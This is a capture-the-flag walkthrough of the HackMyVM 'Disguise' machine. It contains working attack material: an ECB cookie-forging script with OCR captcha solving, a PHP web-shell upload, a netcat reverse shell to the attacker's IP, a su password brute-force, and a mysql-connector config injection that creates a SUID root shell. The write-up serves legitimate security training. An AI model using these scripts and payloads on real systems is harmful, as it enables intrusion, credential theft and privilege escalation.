# Disguise

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.44:22
Open 10.0.2.44:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.44

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKpc4iyFhIzxDvlJoPvgE9rRlFPOqHm4EkLgqXQkVf31csyjpvJgyZpTgr4gYV3oztsMmQbIj+nFGD+L5pQfaSXtAdxKpqt4D/MnFqVKP6KKGFhATWMCDzGXRaXQyaF7dOq49vkIoptczAU2af2PfwycA3aaI/lNPOYSHPRufkm102lE/lHZzNbXh0yJJXy9RJaqELeAibmqdrHFNpXFT8qAvsQrz/6IKJkia4JLdVbfeMdZBOQ9lIlQg+2VfKXp7pF7kGZKKttIThc8ROqlcOaxlmuC5oKEgFQP7obty1+6fx/QIuNn3D05FeQMqbvJfFZF1dE2IH4WEbFWRGH6w1
|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAYupwIuJVRtRMDrYZ6fR/3p5E5vsqXADwGAoZ2RW5vKPxDV3j/+QjGbnRDj1iD5/iwZxxlUggSr5raZfzAHrZA=
|   256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAOshh8VG4l9hWlVYWfAvLuWuwPEdiF8EXmm5BFib/+q
80/tcp open  http    syn-ack Apache httpd 2.4.59 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 6.7.2
|_http-title: Just a simple wordpress site
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.59 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/disguise/writeup.png)

Wordpress scan shows no vulnerabilities
```bash
└─$ nuclei http://disguise.hmv/
└─$ docker run -it --rm wpscanteam/wpscan --url http://10.0.2.44 -e ap --api-token XXX
```

### Dark

Dirbusting will be useless since it's a wordpress, either we have to bruteforce (which will take ages) or try something different. When doing HackMyVM I usually add DNS record for ease of access, but since there's nothing to go on we can fuzz subdomains.
```bash
└─$ domain='disguise.hmv'; ffuf -u "http://$domain/" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fs 0,78524
dark                    [Status: 200, Size: 873, Words: 124, Lines: 19, Duration: 142ms]
```

Kind of intriguing since the domain is not mentioned anywhere on website.

![writeup-1.png](/assets/pentest/hackmyvm/disguise/writeup-1.png)

We can register on `/register.php`, but not much to go on again

![writeup-2.png](/assets/pentest/hackmyvm/disguise/writeup-2.png)

Fuzz some more. 
```bash
└─$ feroxbuster -u http://dark.disguise.hmv/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,403,500 --dont-scan js,css,png,jpeg,jpg,gif -n -x .php,.txt,.html -H 'Cookie: PHPSESSID=u6djonc6h9o9mu3f2f1slnms6u; dark_session=71EjZwZ2Z3YnE9ukihxXiw%3D%3D'
302      GET        0l        0w        0c http://dark.disguise.hmv/logout.php => login.php
200      GET        3l       11w      583c http://dark.disguise.hmv/captcha.php
200      GET       24l       33w      582c http://dark.disguise.hmv/profile.php
200      GET       19l       52w      896c http://dark.disguise.hmv/
200      GET        0l        0w        0c http://dark.disguise.hmv/config.php
200      GET        0l        0w        0c http://dark.disguise.hmv/functions.php
301      GET        9l       28w      323c http://dark.disguise.hmv/images => http://dark.disguise.hmv/images/
200      GET       19l       52w      896c http://dark.disguise.hmv/index.php
200      GET       51l      104w     2103c http://dark.disguise.hmv/register.php
200      GET       33l       60w     1134c http://dark.disguise.hmv/login.php
301      GET        9l       28w      324c http://dark.disguise.hmv/manager => http://dark.disguise.hmv/manager/
```

When `/manager` is accessed we are thrown out to `/login.php`, meaning it requires an admin account to access that page.

If you delete **PHPSESSID** cookie and refresh the page you still get same page. Login page depends on `dark_session` rather then `PHPSESSID`.

![writeup-3.png](/assets/pentest/hackmyvm/disguise/writeup-3.png)

The session is Base64 value, however when decoded it's garbage. I tried removing a byte to see if there would be any errors, but nope. We were still logged in, but without a username.

![writeup-4.png](/assets/pentest/hackmyvm/disguise/writeup-4.png)

### Oracle Padding Attack

Registration also limits username to 8 symbols, something is odd and maybe `dark_session` is not garbage but encrypted data.
```js
function validateForm() {
	var username = document.forms["register"]["username"].value;
	if(username.length > 8) {
		alert("Username cannot exceed 8 characters");
		return false;
	}
	return true;
}
```

Natas 28 has a similar challenge involving `PKCS#7`, but at least it showed some errors d:

```bash
# Username = test02
└─$ echo '71EjZwZ2Z3YnE9ukihxXiw%3D%3D' | php -r 'echo urldecode(stream_get_contents(STDIN));' | base64 -d | xxd
00000000: ef51 2367 0676 6776 2713 dba4 8a1c 578b  .Q#g.vgv'.....W.

# Username = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
└─$ echo 'tMi4d8DYm3U00RGDqRvnVdMI%2B1Tfpd5b%2F8p0bflol2J8ri3PPBhc3UQfKuMy%2FYip' | php -r 'echo urldecode(stream_get_contents(STDIN));' | base64 -d | xxd
00000000: b4c8 b877 c0d8 9b75 34d1 1183 a91b e755  ...w...u4......U
00000010: d308 fb54 dfa5 de5b ffca 746d f968 9762  ...T...[..tm.h.b
00000020: 7cae 2dcf 3c18 5cdd 441f 2ae3 32fd 88a9  |.-.<.\.D.*.2...
```

It’s definitely ECB encryption, since the token’s length scales with the username length, always producing a ciphertext that’s a multiple of the block size, likely padded to fit.

_**Electronic Code Book (ECB)** is a simple mode of operation with a block cipher that's mostly used with symmetric key encryption._ [src](https://www.techtarget.com/searchsecurity/definition/Electronic-Code-Book)

> **Note**: Used BurpSuite to register long username.

```python
import logging
from argparse import ArgumentParser
import requests
from ddddocr import DdddOcr
from urllib.parse import unquote
from base64 import b64decode

class URLs:
    BASE = 'http://dark.disguise.hmv'
    LOGIN = f'{BASE}/login.php'
    REGISTER = f'{BASE}/register.php'
    CAPTCHA = f'{BASE}/captcha.php'

def solve_captcha(session, ocr) -> str:
    response = session.get(URLs.CAPTCHA)
    response.raise_for_status()
    return ocr.classification(response.content).strip().upper()

def register(ocr, username, password):
    session = requests.Session()
    while True: 
        captcha_code = solve_captcha(session, ocr)
        resp = session.post(
            URLs.REGISTER,
            data={'username': username, 'password': password, 'captcha': captcha_code},
            allow_redirects=False,
            proxies = {'http': 'http://127.0.0.1:8080'} # Debug
        )
        
        if '验证码不正确，请重新输入' in resp.text:
            # print(f'[!] Captcha ({captcha_code}) failed for password "{username}:{password}". Retrying...')
            continue  # Retry
        elif resp.status_code == 302:
            # print(f'[+] Successful registered! Password: "{password}", Captcha: "{captcha_code}"')
            return True
        else: 
            return False

def login(username, password):
    resp = requests.post(URLs.LOGIN, data={'username': username, 'password': password}, allow_redirects=False)
    if resp.status_code != 302:
        return None, None

    dark_session = unquote(resp.cookies["dark_session"])
    return dark_session, b64decode(dark_session + '==').hex()

def main():
    ocr = DdddOcr()

    length = 50
    for i in range(length):
        username = password = 'A' * i
        session_cookie, session_hex = login(username, password)
        if (session_cookie, session_hex) != (None, None):
            print(f'[+] Logged in with "{username:<{length}}". dark_session={session_cookie}, hex={session_hex}')
        else:
            success = register(ocr, username, password)
            if success:
                session_cookie, session_hex = login(username, password)
                print(f'[+] Logged in with "{username:<{length}}". dark_session={session_cookie}, hex={session_hex}')
    

if __name__ == '__main__':
    main()
```

Block duplication confirms it's ECB

![writeup-5.png](/assets/pentest/hackmyvm/disguise/writeup-5.png)

New block starts at 12th character and if you notice the first chunk repeats as it's same across. This is especially useful because username we have is `simpleAdmin` (length=11). If we can register `simpleAdmin + char` we should be able to get admin chunk and use it as login cookie.

After some fuzzing only valid login was `simpleAdmin\x01`
```python
import logging
from argparse import ArgumentParser
import string
import requests
from ddddocr import DdddOcr
from urllib.parse import unquote, quote
from base64 import b64decode, b64encode

class URLs:
    BASE = 'http://dark.disguise.hmv'
    LOGIN = f'{BASE}/login.php'
    REGISTER = f'{BASE}/register.php'
    CAPTCHA = f'{BASE}/captcha.php'
    MANAGER = f'{BASE}/manager/index.php'

def solve_captcha(session, ocr) -> str:
    response = session.get(URLs.CAPTCHA)
    response.raise_for_status()
    return ocr.classification(response.content).strip().upper()

def register(ocr, username, password):
    session = requests.Session()
    while True: 
        captcha_code = solve_captcha(session, ocr)
        resp = session.post(
            URLs.REGISTER,
            data={'username': username, 'password': password, 'captcha': captcha_code},
            allow_redirects=False,
            proxies = {'http': 'http://127.0.0.1:8080'} # Debug
        )
        
        if '验证码不正确，请重新输入' in resp.text:
            # print(f'[!] Captcha ({captcha_code}) failed for password "{username}:{password}". Retrying...')
            continue  # Retry
        elif resp.status_code == 302:
            # print(f'[+] Successful registered! Password: "{password}", Captcha: "{captcha_code}"')
            return True
        else: 
            return False

def login(username, password, padding=0):
    resp = requests.post(URLs.LOGIN, data={'username': username, 'password': password}, allow_redirects=False)
    if resp.status_code != 302:
        return None, None

    dark_session = unquote(resp.cookies["dark_session"])
    dark_session_hex = b64decode(dark_session + '==').hex()
    print(f'[+] Logged in with "{username.strip():<{padding}}". dark_session={dark_session}, hex={dark_session_hex}')
    return dark_session, dark_session_hex

def login_manager(dark_session_hex):
    dark_session = quote(b64encode(bytes.fromhex(dark_session_hex[:32])).decode())
    resp = requests.get(URLs.MANAGER, cookies={'dark_session': dark_session}, allow_redirects=False, proxies = {'http': 'http://127.0.0.1:8080'})
    if (status := resp.status_code == 200):
        print(f'\tAccessed manager page with dark_session={dark_session}')
        
    return status
    
def main():
    ocr = DdddOcr()

    username_to_test = 'simpleAdmin'
    length = len(username_to_test) + 1
    for pad in map(chr, range(0, 128)):
        username = password = username_to_test + pad
        session_cookie, session_hex = login(username, password, padding=length)
        if (session_cookie, session_hex) == (None, None):
            if register(ocr, username, password):
                session_cookie, session_hex = login(username, password, padding=length)
                login_manager(session_hex)
        else:
            login_manager(session_hex)

if __name__ == '__main__':
    main()
```

```bash
[+] Logged in with "simpleAdmin". dark_session=x6LzLAkOwpnYwZAiGCjuvMJwkfrsOdSxW16pbszGJLY=, hex=c7a2f32c090ec299d8c190221828eebcc27091faec39d4b15b5ea96eccc624b6
[+] Logged in with "simpleAdmin". dark_session=+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=, hex=fb5fb7fcdc422dc211d09abda83b9d17c27091faec39d4b15b5ea96eccc624b6
        Accessed manager page with dark_session=%2B1%2B3/NxCLcIR0Jq9qDudFw%3D%3D
[+] Logged in with "simpleAdmin". dark_session=TWuSMfkChClwLMtIkhNyZ8JwkfrsOdSxW16pbszGJLY=, hex=4d6b9231f9028429702ccb4892137267c27091faec39d4b15b5ea96eccc624b6
[+] Logged in with "simpleAdmin". dark_session=lyBvj8j7/R9DSgHYqa2poMJwkfrsOdSxW16pbszGJLY=, hex=97206f8fc8fbfd1f434a01d8a9ada9a0c27091faec39d4b15b5ea96eccc624b6
```

### Admin Panel

![writeup-6.png](/assets/pentest/hackmyvm/disguise/writeup-6.png)

We are able to upload PHP code, however it's useless when rendered.

![writeup-7.png](/assets/pentest/hackmyvm/disguise/writeup-7.png)

Filename is also not preserved making it harder to access.
```bash
http://dark.disguise.hmv/images/rev.php
```

### SQLi

The form is injectable

![writeup-8.png](/assets/pentest/hackmyvm/disguise/writeup-8.png)

No complex SQL injection was required. The file gets saved first and then inserted into the query, so anything we upload already ends up in the images directory. Since the name is exposed, we can access it directly and achieve RCE.

```bash
└─$ curl 'http://dark.disguise.hmv/images/e606275d8bb498978c0408f631379b05.php?0=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Reverse Shell (www-data)

```bash
└─$ curl 'http://dark.disguise.hmv/images/e606275d8bb498978c0408f631379b05.php' -G --data-urlencode '0=nc 10.0.2.15 4444 -e /bin/bash'

└─$ nc -lvnp 4444
www-data@disguise:/var/www/dark/images$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@disguise:/var/www/dark/images$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
darksoul:x:1000:1000:,,,:/home/darksoul:/bin/bash

www-data@disguise:/var/www/dark/images$ find /home -type f -ls 2>/dev/null
     2331      4 -rw-r--r--   1 root     root           33 Sep  5 02:36 /home/darksoul/darkshopcount
       64      4 -rw-------   1 darksoul darksoul       68 Apr  2 04:22 /home/darksoul/user.txt
       35      4 -rw-r--r--   1 darksoul darksoul      807 Mar 31 11:19 /home/darksoul/.profile
     3677      4 -rw-r--r--   1 root     root          114 Apr  2 04:03 /home/darksoul/config.ini
       36      4 -rw-r--r--   1 darksoul darksoul     3526 Mar 31 11:19 /home/darksoul/.bashrc
       37      4 -rw-r--r--   1 darksoul darksoul      220 Mar 31 11:19 /home/darksoul/.bash_logout

www-data@disguise:/var/www/dark/images$ cat /home/darksoul/config.ini
[client]
user = dark_db_admin
password = Str0ngPassw0d1***
host = localhost
database = dark_shop
port = int(3306)
```

### MySQL

```bash
www-data@disguise:/var/www/dark/images$ mysql -u'dark_db_admin' -p'Str0ngPassw0d1***' -e 'SHOW DATABASES;'
+--------------------+
| Database           |
+--------------------+
| dark_shop          |
| information_schema |
+--------------------+
www-data@disguise:/var/www/dark/images$ mysql -u'dark_db_admin' -p'Str0ngPassw0d1***' 'dark_shop' -e 'SHOW TABLES;'
+---------------------+
| Tables_in_dark_shop |
+---------------------+
| products            |
| users               |
+---------------------+
www-data@disguise:/var/www/dark/images$ mysql -u'dark_db_admin' -p'Str0ngPassw0d1***' 'dark_shop' -e 'SELECT * FROM users WHERE isAdmin=1;'
+----+-------------+--------------------------+---------+---------------------+
| id | username    | password                 | isAdmin | created_at          |
+----+-------------+--------------------------+---------+---------------------+
|  1 | simpleAdmin | U3RyMG5nUGFzc3cwZDFAQEA= |       1 | 2025-04-01 04:33:22 |
+----+-------------+--------------------------+---------+---------------------+
```

None of the passwords work
```bash
└─$ sshpass -p 'Str0ngPassw0d1***' ssh darksoul@disguise.hmv
darksoul@disguise.hmv: Permission denied (publickey).

└─$ sshpass -p 'U3RyMG5nUGFzc3cwZDFAQEA=' ssh darksoul@disguise.hmv
darksoul@disguise.hmv: Permission denied (publickey).

└─$ sshpass -p 'Str0ngPassw0d1@@@' ssh darksoul@disguise.hmv
darksoul@disguise.hmv: Permission denied (publickey).
```

### Brute-force

Looking at the password pattern the user who implemented likes to use `Str0ngPassw0d1` and then 3 characters. Pattern is weak and we could brute-force it.

But first of all SSH authentication with password is denied to this user, previous passwords didn't work with `su` too.
```bash
www-data@disguise:/var/www/dark/images$ cat /etc/ssh/sshd_config | grep -vE '#|^$'
PermitRootLogin yes
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server
Match User darksoul
    PasswordAuthentication no
```

```bash
#!/bin/bash
while IFS= read -r line; do
    if echo "$line" | timeout 0.7 su - darksoul -c "whoami" &>/dev/null; then
        echo "Password found: $line"
        break
    fi
done < <(python3 -c "print('\n'.join('Str0ngPassw0d1' + p*3 for p in __import__('string').punctuation))")
```

```bash
# Run  as 1 liner
www-data@disguise:/var/www/dark/images$ python3 -c "print('\n'.join('Str0ngPassw0d1'+p*3 for p in __import__('string').punctuation))" | while IFS= read -r line; do echo "$line" | timeout 0.7 su - darksoul -c whami &>/dev/null && { echo "Password found: $line"; break; }; done
Password found: Str0ngPassw0d1???
```

## SSH (darksoul)

```bash
└─$ ssh-keygen -f id_rsa -q -P x
└─$ cat id_rsa.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqsjuZ5aCmHR2qgmlmU+br8nWn4+CYcxYBjgnBQJFkI woyag@kraken
```

```bash
www-data@disguise:/var/www/dark/images$ su - darksoul
darksoul@disguise:~$ mkdir ~/.ssh
darksoul@disguise:~$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqsjuZ5aCmHR2qgmlmU+br8nWn4+CYcxYBjgnBQJFkI woyag@kraken' > ~/.ssh/authorized_keys
```

```bash
└─$ ssh -i id_rsa darksoul@disguise.hmv
darksoul@disguise:~$ id
uid=1000(darksoul) gid=1000(darksoul) groups=1000(darksoul)
```

### User.txt

Ha?
```
darksoul@disguise:~$ cat user.txt
Good good study & Day day up,but where is the flag?
```

The flag is in the file, but a carriage return `\r` hides it when viewed with cat (by default).
```bash
darksoul@disguise:~$ xxd user.txt
00000000: 476f 6f64 2067 6f6f 6420 7374 7564 7920  Good good study
00000010: 2620 4461 7920 6461 7920 7570 2c62 7574  & Day day up,but
00000020: 2077 6865 7265 2069 7320 7468 6520 666c   where is the fl
00000030: 6167 3f0a 686d 767b 6869 6464 656e 666c  ag?.hmv{hiddenfl
00000040: 6167 7d0d                                ag}.
darksoul@disguise:~$ cat -v user.txt ;echo
Good good study & Day day up,but where is the flag?
hmv{hiddenflag}^M
```

## Privilege Escalation (root)

No sudo privileges or SUID binaries.

There's somewhat unusual script in `/opt`
```python
darksoul@disguise:~$ cat /opt/query.py
import mysql.connector
import sys

def main():
    if len(sys.argv) != 2:
        print("Usage: python query.py <configfile>")
        sys.exit(1)

    cnf = sys.argv[1]

    try:
        conn = mysql.connector.connect(read_default_file=cnf)
        cursor = conn.cursor()

        query = 'SELECT COUNT(*) FROM users'
        cursor.execute(query)
        results = cursor.fetchall()
        print(f"users count:{results[0][0]}")

        query = 'SELECT COUNT(*) FROM products'
        cursor.execute(query)
        results = cursor.fetchall()
        print(f"products count:{results[0][0]}")
    except mysql.connector.Error as err:
        print(f"db connect error: {err}")
    finally:
        if 'cursor' in locals():
            cursor.close()
        if 'conn' in locals() and conn.is_connected():
            conn.close()

if __name__ == "__main__":
    main()
```

Monitor for changes to file
```bash
#!/bin/bash

file="/home/darksoul/darkshopcount"
last_mtime=$(stat -c %Y "$file")

while true; do
    sleep 1
    new_mtime=$(stat -c %Y "$file")
    if [[ "$new_mtime" != "$last_mtime" ]]; then
        delta=$(( new_mtime - last_mtime ))
        echo "Modify: $(stat -c %y "$file")  (Δ ${delta}s)"
        last_mtime=$new_mtime
    fi
done
```

```bash
darksoul@disguise:~$ file="/home/darksoul/darkshopcount"; last=$(stat -c %Y "$file"); while sleep 1; do new=$(stat -c %Y "$file"); [[ $new != $last ]] && echo "Modify: $(stat -c %y "$file") (Δ $((new-last))s)" && last=$new; done
Modify: 2025-09-05 03:24:01.411837989 -0400 (Δ 60s)
Modify: 2025-09-05 03:25:01.447738035 -0400 (Δ 60s)
```

```bash
darksoul@disguise:~$ pip list | grep mysql
mysql-connector-python 8.0.33
```

[https://cvefeed.io/vuln/product/68556/oraclemysql_connectorpython](https://cvefeed.io/vuln/product/68556/oraclemysql_connectorpython)

[CVE-2025-21548](https://cvefeed.io/vuln/detail/CVE-2025-21548): Oracle MySQL Connectors Remote Code Execution Vulnerability

Weird flex, but there's no public POCs available for this. We can try to hunt down the vulnerability via git commits since it's open source
```powershell
➜ git clone https://github.com/mysql/mysql-connector-python.git
➜ git log --oneline | sls 'BUG#' | sls RCE

9b86b29 BUG#37859771 - mysql/connector python version 9.3.0 has a regression which cannot persist binary data with percent signs in it
f72a132 BUG#36452514: Missing version info resources
dd9ded0 BUG#37145655: MySQL Connector/Python Configuration Files RCE
```

![writeup-9.png](/assets/pentest/hackmyvm/disguise/writeup-9.png)

Looks like `allow_local_infile` is the culprit into the RCE.

You can use `pspy` to understand what command is being ran by root, but it's easy to deduct and wait that `config.ini` is used by root. It's in our home, however we can't write it. In your home you can do whatever, such as remove the file and create new one.
```bash
darksoul@disguise:~$ ls -lh
total 3.0M
-rw-r--r-- 1 root     root      114 Apr  2 04:03 config.ini
-rw-r--r-- 1 root     root       33 Sep  5 04:41 darkshopcount
-rw-r--r-- 1 darksoul darksoul 3.0M Sep  6  2024 pspy64
-rw------- 1 darksoul darksoul   68 Apr  2 04:22 user.txt
darksoul@disguise:~$ cp config.ini config.ini.bak
darksoul@disguise:~$ rm config.ini
rm: remove write-protected regular file 'config.ini'? y
darksoul@disguise:~$ cp config.ini.bak config.ini
darksoul@disguise:~$ echo 'allow_local_infile=__import__("os").system("install -m4777 /bin/bash /tmp/rootbash")' >> config.ini
darksoul@disguise:~$ cat config.ini
[client]
user = dark_db_admin
password = Str0ngPassw0d1***
host = localhost
database = dark_shop
port = int(3306)
allow_local_infile=__import__("os").system("install -m4777 /bin/bash /tmp/rootbash")
```

After some time script executes and you get SUID bash
```bash
darksoul@disguise:~$ ls -l /tmp/rootbash
-rwsrwxrwx 1 root root 1168776 Sep  5 04:43 /tmp/rootbash
darksoul@disguise:~$ /tmp/rootbash -p
rootbash-5.0# id
uid=1000(darksoul) gid=1000(darksoul) euid=0(root) groups=1000(darksoul)
```

### Root.txt

```
rootbash-5.0# cat /root/root.txt
#Congratulations!!!
hmv{CVE-2025-21548}
```